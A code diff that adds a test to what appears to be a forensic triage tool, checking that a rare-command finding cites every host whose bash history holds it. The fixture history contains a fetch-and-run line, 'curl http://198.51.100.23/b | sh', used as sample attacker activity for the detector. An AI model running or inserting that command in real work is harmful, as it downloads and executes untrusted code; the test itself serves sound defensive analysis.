@@ -139,6 +139,22 @@ def test_rare_cites_the_host_row(tmp_path):
     assert rows[0]["hash"] == next(r["hash"] for r in page["rows"] if r["ref"] == "3")
 
 
+def test_rare_cites_every_host_with_it(tmp_path):
+    path = Path(case(tmp_path))
+    second = path / "lab-ubuntu2" / "artefacts" / "cooked"
+    second.mkdir(parents=True)
+    (second / "gandalf+bash_history.csv").write_text("Command\ncurl http://198.51.100.23/b | sh\n")
+    sources = json.dumps([["lab-ubuntu", "artefacts/cooked/gandalf+bash_history.csv", "3"],
+                          ["lab-ubuntu2", "artefacts/cooked/gandalf+bash_history.csv", "2"]])
+    header = "Rank,Score,Family,Value,Hosts With It,Hosts In Case,Hosts,Reasons,Artefact,Example,Host,Row,Sources\n"
+    (path / "stacking.csv").write_text(header + "1,1.0,process,curl,2,12,lab-ubuntu; lab-ubuntu2,rare,"
+                                       "artefacts/cooked/gandalf+bash_history.csv,,lab-ubuntu,3,\"" +
+                                       sources.replace('"', '""') + "\"\n")
+    rows = eru_offline.answer_with_rows("rare", str(path))["rows"]
+    assert [(r["host"], r["row_ref"]) for r in rows] == [("lab-ubuntu", "3"), ("lab-ubuntu2", "2")]
+    assert rows[0]["line"] == rows[1]["line"]
+
+
 def test_stacking_persistence_families_match():
     sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src" / "analysis"))
     from rivendell.analysis import stacking
